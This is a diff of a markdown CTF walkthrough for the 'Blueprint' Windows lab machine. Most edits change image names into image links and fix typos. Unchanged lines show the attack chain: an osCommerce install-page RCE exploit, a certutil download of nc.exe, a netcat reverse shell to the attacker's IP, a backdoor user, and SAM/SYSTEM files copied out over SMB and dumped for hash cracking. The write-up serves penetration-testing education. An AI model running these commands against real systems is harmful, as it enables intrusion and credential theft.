@@ -6,7 +6,7 @@
 
 ----------------------------------------------------------------------
 
-blueprint.jpeg
+![blueprint.jpeg](../assets/blueprint_assets/blueprint.jpeg)
 
 `Do you have what is takes to hack into this Windows Machine?`
 
@@ -126,33 +126,37 @@ Nmap done: 1 IP address (1 host up) scanned in 78.47 seconds
 
 Taking a look at the SMB shares, it looks like we have Read access to the `Users` share:
 
-smb.png
+![smb.png](../assets/blueprint_assets/smb.png)
 
 However, after browsing around a bit, I didn't find anything of interest. We can come back to that later if needed.
 
 Trying HTTP on port 80 we get a 404 error:
 
-404.png
+![404.png](../assets/blueprint_assets/404.png)
 
 Yet interestingly, if we navigate to either port 443 or to port 8080, we find a directory:
 
-443.png
+![443.png](../assets/blueprint_assets/443.png)
 
 The directory is oscommerce-4.3.4. Clicking into the directory we can navigate to `catalog` and we are presented with an estore. 
 
 Search for oscommerce vulnerabilites, I find this public exploit: https://www.exploit-db.com/exploits/50128
 
-edb.png
+![edb.png](../assets/blueprint_assets/edb.png)
 
 Looks like the exploit is dependent on the `/install` directory not having been removed by the administrator upon setup. Lets manually go check that for ourselves before trying out the exploit.
 
-install.png
+![install.png](../assets/blueprint_assets/install.png)
 
 Nice! The admin failed to remove this page- this exploit may work for us.
 
 Taking a quick look at the exploit it looks like it creates a function `rce(command)` which will take user input and tagets `/install/install.php?step=4`
 
+![code.png](../assets/blueprint_assets/code.png)
+
 It then tests out a command with `whoami` in the `cmd` variable, and if all goes to plan we should be able to issue commands with the `RCE_SHELL$` terminal prompt.
+
+![test.png)](../assets/blueprint_assets/test.png)
 
 Lets give this exploit a try!
 
@@ -188,7 +192,7 @@ Note: I ran this exploit against port 8080 to bypass issues I was getting with t
 
 This pseudo-shell is nice, but I would rather have a proper shell. Let's use Certutil to transfer over nc.exe to the target:
 
-transfer.png
+![transfer.png](../assets/blueprint_assets/transfer.png)
 
 (I'm not sure why sometimes on Windows targets I get two hits on my Python server. If anyone knows feel free to reach out!)
 
@@ -198,9 +202,9 @@ Now that nc.exe is on the box, all I need to do is set up a NetCat listener and 
 nc.exe -e cmd.exe 10.6.61.45 443
 ```
 
-shell.png
+![shell.png](../assets/blueprint_assets/shell.png)
 
-Cool, now we're in business, and have a bit more stable of a shell. If I wanted even more persistance, and because I'm nt\system on the target I could do something like:
+Cool, now we're in business, and have a bit more stable of a shell. If I wanted even more persistence, and because I'm nt\system on the target, I could do something like:
 
 ```text
 net user hacker password123 /add
@@ -210,17 +214,17 @@ But that is likely overkill for our purposes here today.
 
 Lets go ahead and grab the root.txt flag:
 
-root_flag.png
+![root_flag.png](../assets/blueprint_assets/root_flag.png)
 
 ### "Lab" User's NTLM Hash:
 
-Now normally this would be all that we need in a CTF, but this box is also asking for the NTLM hash of the user 'Lab'- Lets track that down.
+Now normally this would be all that we need in a CTF, but this box is also asking for the NTLM hash of the user 'Lab' - Lets track that down.
 
 I would normally use Mimikatz for a task like this, but was having a hard time getting it to work properly. This is a really old target, and I'm not entirely too sure what the issue was.
 
-Either way, it reinforces how important it is to know several ways to get the job done. Lets 'live off the land' abit more so to speak and dump the SAM and SYSTEM files back to our machine.
+Either way, it reinforces how important it is to know several ways to get the job done. Lets 'live off the land' a bit more so to speak and dump the SAM and SYSTEM files back to our machine.
 
-Firstly I'll need to set upan SMB server on my attacking machine:
+Firstly I'll need to set up an SMB server on my attacking machine:
 
 ```text
 impacket-smbserver ryan .
@@ -232,7 +236,7 @@ net use * \\10.6.61.45\ryan
 ```
 We can confirm now that the machines are connected:
 
-server.png
+![server.png](../assets/blueprint_assets/server.png)
 
 Now we just need to prepare the desired files:
 
@@ -265,15 +269,15 @@ samdump2 SYSTEM SAM
 ```
 To extract the stored NTLM hashes of the users:
 
-hashes.png
+![hashes.png](../assets/blueprint_assets/hashes.png)
 
 Cool, lets head over to https://crackstation.net/ and crack this hash:
 
 (Obviously on a real engagement you're definitely not gonna wanna post live password hashes in a site like this, but it's a huge time saver on CTFs)
 
-Cool, Crackstation instantly cracked the hash
+Nice, Crackstation instantly cracked the hash
 
-crack.png
+![crack.png](../assets/blueprint_assets/crack.png)
 
 And that's that! Thank you for following along,
 
